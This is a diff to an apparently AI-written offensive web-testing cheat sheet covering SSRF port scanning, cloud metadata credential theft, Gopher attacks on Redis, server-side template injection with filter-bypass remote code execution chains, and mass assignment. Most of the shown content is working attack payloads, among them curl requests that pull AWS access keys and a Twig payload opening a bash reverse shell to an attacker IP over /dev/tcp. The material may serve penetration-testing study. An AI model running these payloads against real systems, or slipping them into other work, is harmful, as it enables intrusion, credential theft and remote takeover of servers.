@@ -69,7 +69,7 @@ for port in 22 25 80 443 3306 5432 6379 8080 8443 27017; do
 done
 
 # ffuf for port scan
-ffuf -w <(seq 1 65535 | tr '\n' '\n') -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ/" -fs 0 -mc all -t 50
+ffuf -w <(seq 1 65535) -u "http://<target>/fetch?url=http://127.0.0.1:FUZZ/" -fs 0 -mc all -t 50
 ```
 
 ### Cloud Metadata
@@ -83,9 +83,10 @@ curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/user-data"
 # Returns: AccessKeyId, SecretAccessKey, Token — use with aws cli
 
 # AWS IMDSv2 (requires token — try v1 first)
-# Step 1: get token (may not work via SSRF)
-curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
-# Alternate: try via Gopher (see below)
+# Step 1: the token endpoint is a PUT — a plain GET-only SSRF sink CANNOT reach it,
+# which is the whole point of IMDSv2. Only works if the sink lets you set method+headers:
+curl -s -X PUT "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# Alternate: send a raw PUT via Gopher (see below)
 
 # Azure IMDS
 curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
@@ -150,8 +151,8 @@ Gopher lets you send raw TCP data — reach Redis, Memcached, SMTP, MySQL:
 # BGSAVE
 
 # URL: gopher://127.0.0.1:6379/_<URL-encoded redis commands>
-# Use Gopherus to generate payloads:
-# pip install gopherus  OR  git clone https://github.com/tarunkant/Gopherus
+# Use Gopherus to generate payloads (clone + install, it's a py2 script):
+# git clone https://github.com/tarunkant/Gopherus && ./Gopherus/install.sh
 gopherus --exploit redis
 # Enter: phpshell / crontab / etc.
 # Copy output URL into SSRF parameter
@@ -203,7 +204,7 @@ curl -s "http://<target>/page?name=%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C."
 curl -s "http://<target>/page?name={{7*7}}"      # Jinja2/Twig → 49
 curl -s "http://<target>/page?name=${7*7}"        # Freemarker/Mako → 49
 curl -s "http://<target>/page?name=<%= 7*7 %>"   # ERB/EJS → 49
-curl -s "http://<target>/page?name=#{7*7}"        # Ruby ERB → 49
+curl -s "http://<target>/page?name=#{7*7}"        # Ruby/Slim interpolation → 49
 curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig → 49
 
 # Engine fingerprint decision tree:
@@ -254,11 +255,6 @@ curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read
 {{request|attr('__class__')}}
 {{request|attr('__class__')|attr('__mro__')}}
 
-# Combine with char codes to avoid any literal string matching
-# underscore = chr(95), so __ = chr(95)~chr(95)
-{% set us = namespace(x='') %}
-{% set us.x = joiner.__init__.__globals__ %}  # if __ not filtered at this depth
-
 # Full RCE chain using attr() to avoid __ in argument positions:
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 # \x5f = _ in hex — bypasses string-based filters
@@ -276,15 +272,15 @@ curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read
 # Version check
 {{_self.env.getExtension('Twig_Extension_Debug')}}
 
-# RCE
+# RCE — Twig 1.x ONLY (_self.env was removed in Twig 2/3, these fail on modern Symfony)
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
 
-# Twig v2+
+# Twig 2/3 — use built-in filters as the exec sink instead
 {{['id']|map('system')|join}}
 {{['id']|filter('system')}}
 
-# Reverse shell
+# Reverse shell (Twig 1.x)
 {{_self.env.registerUndefinedFilterCallback("exec")}}
 {{_self.env.getFilter("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'")}}
 ```
@@ -312,9 +308,6 @@ curl -s --data-urlencode "name={{cycler.__init__.__globals__.os.popen('id').read
 $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
-
-# Simpler (if ClassTool available)
-#set($runtime=<% Runtime.getRuntime() %>)
 ```
 
 ### SSTImap (Automation)
@@ -330,7 +323,7 @@ python3 sstimap.py -u "http://<target>/page?name=*"
 # Interactive shell
 python3 sstimap.py -u "http://<target>/page?name=*" --os-shell
 
-# Run single command
+# Run single command  (confirm the flag with `sstimap.py -h` — builds vary; some use --os-cmd)
 python3 sstimap.py -u "http://<target>/page?name=*" -c "id"
 
 # POST parameter
@@ -371,9 +364,11 @@ curl -s -X POST "http://<target>/checkout" -H "Content-Type: application/x-www-f
 ### Framework-Specific Notes
 
 ```bash
-# Ruby on Rails — params.permit() whitelist bypass
-# If controller uses: params.require(:user).permit(:username, :email)
-# Try passing: user[admin]=true in POST body
+# Ruby on Rails — mass assignment happens when params AREN'T filtered
+# Strong params STRIP non-permitted keys, so adding user[admin]=true to a proper
+# permit(:username, :email) does NOTHING. It's exploitable only when the controller
+# skips strong params, uses params.require(:user).permit! (permit everything), or a
+# legacy attr_accessible/attr_protected misconfig — THEN user[admin]=true binds.
 
 # Laravel/PHP — $fillable vs $guarded
 # If $guarded = [] → all fields bindable
@@ -487,5 +482,5 @@ curl -sv "http://<target>/redirect?url=https://example.com" 2>&1 | grep -i "^< l
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
